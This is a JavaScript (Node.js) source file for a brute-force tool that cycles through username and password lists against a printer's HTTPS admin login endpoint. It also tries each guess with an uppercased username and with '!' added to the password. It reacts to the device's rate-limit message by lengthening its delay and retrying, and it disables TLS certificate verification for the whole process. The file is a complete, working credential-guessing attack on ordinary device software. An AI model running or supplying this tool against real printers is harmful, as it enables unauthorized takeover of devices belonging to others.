// Allows Node's Request to ignore self-signed cert the dashboard uses
process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
const https = require("https");

module.exports = class BruteForcer {
	constructor(printerIp, {log=false, logPassword=false}) {
		this.ip = printerIp;
		this.logger = {
			log: !!log,
			logPassword: !!logPassword,
		}

		this.checked = new Set();

		this.state = {
			username: 0,
			password: 0,
			exclamation: false,
			uppercaseUsername: false,
			wait: 2200,
		}
	}

	async crack(usernames, passwords) {
		this.state.username = 0;
		this.state.password = 0;

		let found = false;
		for (;this.state.username<usernames.length;this.state.username++) {
			for (;this.state.password<passwords.length;this.state.password++) {
				found = await this._runStateCombos(usernames, passwords);
				if (found) break;
			}
			if (found) break;
			this.state.password = 0;
		}

		if (!found) return null;

		return {
			username: usernames[this.state.username],
			password: passwords[this.state.password],
		};
	}

	async _postLogin(username, password) {
		// application/x-www-form-urlencoded requires the syntax "UrlEncodedKey=UrlEncodedValue&UrlEncodedKey2=UrlEncodedValue2"
		const xFormBody = `${encodeURI('INPUTT_USERNAME')}=${encodeURI(username)}&${encodeURI('INPUTT_PASSWORD')}=${encodeURI(password)}&INPUTT_DUMMY=&INPUTT_ACCSESSMETHOD=0`;

		return this._performRequest(xFormBody)
	}

	async testCombo(username, password) {
		const r = await this._postLogin(username,password);
		if (r.includes("Try again later.")) throw new Error("Too Many Requests");
		return !r.includes("Incorrect user name or password");
	}

	_sleep(ms) {
		return new Promise(r => setTimeout(r, ms));
	}

	_performRequest(requestBody) {
		return new Promise((resolve, reject) => {

			const options = {
				hostname: this.ip,
				port: 443,
				path: '/PRESENTATION/ADVANCED/PASSWORD/SET',
				method: 'POST',
				headers: {
					'Content-Type': 'application/x-www-form-urlencoded',
					'Content-Length': Buffer.byteLength(requestBody)
				}
			};

			// const req = http.request(options, function (res) { // For HTTP
			const req = https.request(options, function (res) {
				// This may need to be modified based on your server's response.
				res.setEncoding('utf8');

				let responseBody = '';

				// Build JSON string from response chunks.
				res.on('data', (chunk) => responseBody = responseBody + chunk);
				res.on('end', function () {
					const parsedBody = responseBody;

					// Resolve or reject based on status code.
					res.statusCode !== 200 ? reject(parsedBody) : resolve(parsedBody);
				});
			});

			// Make sure to write the request body.
			req.write(requestBody);
			req.end();
			req.on('error', function (e) { reject(e); });
		});
	}

	_makeCombo(usernames, passwords) {
		let username = usernames[this.state.username];
		let password = passwords[this.state.password];

		if (this.state.uppercaseUsername) username = username.toUpperCase();
		if (this.state.exclamation) password += "!";

		return {username, password};
	}

	storeChecked(username, password) {
		return this.checked.add(`${username}::::${password}`);
	}

	comboUsed(username, password) {
		return this.checked.has(`${username}::::${password}`);
	}

	_logInfo(username, password) {
		let s = `[Username: ${username}]`;

		if (this.logger.logPassword) s+= ` [Password: ${password}]`;
		else s += ` [Password ${this.state.exclamation ? "with '!'" : "as-is"}]`;

		return s;
	}

	async _runStateCombos(usernames, passwords) {
		let correct = false;
		while(true) {
			const {username, password} = this._makeCombo(usernames, passwords);

			if (!this.comboUsed(username, password)) {
				await this._sleep(this.state.wait);

				try {
					if (this.logger.log) console.info(`Trying ${this._logInfo(username, password)}`);
					correct = await this.testCombo(username, password);
				} catch(err) {
					this.state.wait += 300;
					if (this.logger.log) console.log("Rate-limited, increasing to %s, then trying again", this.state.wait);
					continue;
				}

				this.storeChecked(username, password);

				if (correct) return true;
			} else if (this.logger.log) {
				console.info(`Skipping checked combo ${this._logInfo(username, password)}`);
			}

			if (!this.state.exclamation && !this.state.uppercaseUsername) {
				this.state.exclamation = true;
				continue;
			}
			if (!this.state.uppercaseUsername && this.state.exclamation) {
				this.state.uppercaseUsername = true;
				continue;
			}
			if (this.state.uppercaseUsername && this.state.exclamation) {
				this.state.exclamation = false;
				continue;
			}

			this.state.uppercaseUsername = false;
			this.state.exclamation = false;

			return false;
		}

		return correct;
	}
}
